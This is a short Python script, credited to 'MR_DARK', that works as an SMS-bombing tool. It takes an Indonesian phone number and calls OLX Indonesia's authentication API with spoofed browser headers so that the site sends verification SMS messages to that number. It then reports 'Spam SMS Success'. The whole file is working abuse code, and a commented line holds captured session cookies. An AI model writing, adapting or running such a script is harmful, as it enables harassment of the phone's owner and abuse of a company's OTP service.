import requests,sys,time
from requests import post
from requests import get
nomor = sys.argv[1]
work = f"""
[»] *Tools By MR_DARK*
*[»]* *Spam SMS* *+62{nomor}* *Success* :)
*Message:* 1 sms spam terkirim
"""
gagal = f"""
[»] *Tools By MR_DARK*
*[»]* *Spam SMS* *+62{nomor}* *gagal* :(
*Message:* Unknown error code
"""
headers = {
    'authority': 'www.olx.co.id',
    'accept': '*/*',
    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'laquesis=pan-59312@a#pan-59740@a#pan-60601@b#pan-67471@b; lqstatus=1659353381; bm_sz=0D9CDCFAD3EA0B8DE6E91A61D5CB9E2D~YAAQlxFDJHL8xiOCAQAAJeoYWRDS+jdvv/JMOS2YEnJE2ImgAdSvQZiPF9hwcujY2zadWnNeIhYXfIP+y8qENfnxnchU88RidtrdUAODWubrWn2SypbKoGyO6mSvvMpQhRraqa2pdUGTBAZSVq0Yw3miLBfehaMw2yFAOaNjUIwG9qimc6kLT1SQlpJOHGZloH4wblCXl5AEGSGK8Pz9Bm6GWUMTxgoCIC7Xt3kEdMmqiErYWmF4tgenKB7Vkb43y5G69wIlu7bBn34KCXe0NxSZgKCTAcI4TiyNB/TPKj2WCg==~3687477~4342851; ak_bmsc=AE0B31A1B545BD2F56CDB036B061FA5F~000000000000000000000000000000~YAAQlxFDJNz9xiOCAQAAie8YWRCal3r2VK2EsiQIVOZhQ7JCkLc8ICcOhkgxnCsyG43BK0/PEcokxrNrmBTqaV0aaH1nzUJXk5oub1sXozy/bm41EeHalv5gD0mRnHzmgHV2eif0+hhmkWlauO7IqRVxOutyQzus1D/AbfOH4rP5Af/k8/4+0x3qCD51RavkvG54mf4yar6cv+es6BK1cllu99BHeI9W+Heb4uWLfVCvMGxNep0PYvn78zATeAKqmOkmVISgsxV/5bzN7cjx6Zt9VShVbBlBvfHOS9KfKjxVDiDa4cA91ZY4Hcn/0EFMnKVfKAFnEC5AiTULL+Jb/u/VOwRsfA2QCb7MKdjy02WX1xlnEqKpCzDKLBO3C4bgqIA2DD+U+p37c9G+M9Avd2RL++vHYCmgR/E8J4xkZDqrJ26rED1QFhWNPzGgXlb+y6aS3l/1V8JcZyXHZVoXcrTziE6iVpWvDr35iuifeYgVFH1vmFxfX/CcsGP8HXNTj7rgCdWd7FcNtxAkjhuiPkdF9g==; ldTd=true; __exponea_etc__=9d63858f-4d27-4f40-a074-d8a5165f80a6; __exponea_time2__=0.504655122756958; _ga=GA1.3.741210495.1659352183; _gid=GA1.3.1784468911.1659352183; _gcl_au=1.1.647933986.1659352183; _rtb_user_id=223ff2f9-757f-0c89-4729-1e94b6a7613d; WZRK_G=bbc67d6e9b744fdc8693bb278b6a49b9; _fbp=fb.2.1659352183202.2061570537; MgidSensorNVis=1; MgidSensorHref=https://www.olx.co.id/; AMP_TOKEN=%24NOT_FOUND; _gat_UA-116132414-3=1; __gads=ID=023172b2d161830a:T=1659352183:S=ALNI_Ma_b2JDHHMrzkwSC0Y12QeuRp3Zzw; __gpi=UID=000008263fd48c2c:T=1659352183:RT=1659352183:S=ALNI_MZFjfTnWGXJWKhyYQ9F-ytNGak1eg; _tt_enable_cookie=1; _ttp=06f714d0-28ec-408f-9544-6d4aee6c1d46; cto_bundle=2H6bMF9BOFJ2dndES0s1TWRUekJlViUyQkJ3JTJCUEp0aHJUcEUlMkZkSmJaMkNEaVU5Mm5SWUNtUWFpJTJGVHM4OWRveFlObEJzS1pOelV5WnBkT3BXQlFBdlBQQ0M3ZyUyQnRkY1hYOUt6WnElMkZTZ3NXMGFXazk4M2JxV1JFazdBJTJGd3loYlZSODlUTDJhZWFOajRpblE0akV3diUyQnVUYktlQTlBJTNEJTNE; g_state={"i_p":1659359385305,"i_l":1}; G_ENABLED_IDPS=google; _abck=338B2C469AB796C415E30D28DAF3B190~0~YAAQlxFDJOwNxyOCAQAAaCwZWQheezBhJnM7Q3GPfMe7cIB5VV3zHUwtltsCMVTJqm/sCGNzbJYxmKOl0c0V6AMe1ljRQJnktUecwcJbGYWvymG0jZbxMuDLanIQ+y3LxrqzNK98XcDAYtkMhwnFRYqZansjp/CEn3Bd/6gItIbpN5lnZ+wXmFNRkDZ5tVst/fAbtpGvQjvbWUyW/xStPgJNzlfDvWMFbAseDlISlIWmoXS7ynytsQTQkDXcOsHKlMPGRqJkjc1bXWMIZFlGS1+ObyHV6QPKzvnKwgyFdVel0wDEkgyU139WAMiHqq1auTPXa7+O+bl4kXBoLENXT5wOh6bjT9v2UO6uOzed2oJIHpXal0zbQqN0xSZVCO9985LMyv/qRxLgCwZUEZliBH6ub2b53AJz~-1~-1~-1; bm_sv=6AAF6B1D52811D42707AF6A84E0D49E6~YAAQlxFDJO0NxyOCAQAAaCwZWRAT1j1JbTWD+gyDbpbyqAVAdFELni4VTQXBpJviR2DYVg373uen1RJsVLzu/KEaUIDPYN+dklpvZlAkqOEfJbatV7kD3Gwkr1BRcI0c+jvEOEVlUVSa8BgYnaNClOcOf6C65h35A1z1HYvSGjQMbVg+mD+u82gQLqoD2sb2v0Bfq8Y8jrrl79lFV/5rPsxJ1mKUMnIo2gZbnNEzMc2V/8Ue5ojcisuTbmHt3NI=~1; onap=1825918e854x7482d320-1-1825918e854x7482d320-12-1659353998; WZRK_S_W6K-746-995Z=%7B%22p%22%3A1%2C%22s%22%3A1659352183%2C%22t%22%3A1659352198%7D',
    'origin': 'https://www.olx.co.id',
    'referer': 'https://www.olx.co.id/',
    'sec-ch-ua': '" Not;A Brand";v="99", "Microsoft Edge";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.77',
    'x-panamera-fingerprint': '34c81b643fbe13a123a1d8a978366352#1659352182085',
}

json_data = {
    'grantType': 'retry',
    'method': 'sms',
    'phone': '+62'+nomor,
    'language': 'id',
}

response = requests.post('https://www.olx.co.id/api/auth/authenticate', headers=headers, json=json_data).text
b = "PENDING"
if b in response:
     print(work)
else:
     print(gagal)